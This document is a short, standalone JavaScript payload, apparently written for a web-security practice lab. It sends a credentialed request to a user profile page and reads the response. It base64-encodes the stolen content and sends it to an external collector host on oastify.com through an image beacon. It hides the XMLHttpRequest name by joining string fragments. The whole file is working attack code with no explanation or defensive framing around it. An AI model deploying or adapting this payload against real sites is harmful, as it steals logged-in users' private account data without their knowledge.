(() => {
  try {
    var url = "//lab1.demo-pentest.pp.ua/user/profile";
    var name = ["XM", "LH", "tt", "pRe", "ques", "t"].join("");
    var Ctor = window[name];
    var req = new Ctor();
    req.open("GET", url, true);
    req.withCredentials = true;
    req.onreadystatechange = () => {
      if (req.readyState === 4 && req.status === 200) {
        var text = req.responseText;
        var b64 = btoa(unescape(encodeURIComponent(text)));
        var exfil = "//87dvf2a4jy60ervhgkfaxyxhv81zpqje8.oastify.com/collect"
          + "?source=" + encodeURIComponent(url)
          + "&data=" + encodeURIComponent(b64);
        var img = new Image();
        img.src = exfil;
      }
    };
    req.send(null);
  } catch (e) {
    console.log(e);
  }
})();
